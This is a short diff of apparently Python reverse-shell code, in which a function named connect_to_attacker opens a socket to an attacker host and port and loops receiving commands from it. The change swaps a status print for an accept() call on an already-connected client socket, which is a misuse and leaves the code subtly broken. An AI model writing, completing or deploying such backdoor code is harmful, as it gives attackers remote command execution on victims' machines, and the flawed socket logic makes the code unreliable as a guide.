@@ -9,7 +9,8 @@ def connect_to_attacker():
     attacker_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
     attacker_socket.connect((attacker_host, attacker_port))
 
-    print('Connection established with the attacker.')
+    client_address = attacker_socket.accept()
+    print(f"Incoming connection from: {client_address}")
 
     while True:
         command = attacker_socket.recv(1024).decode()
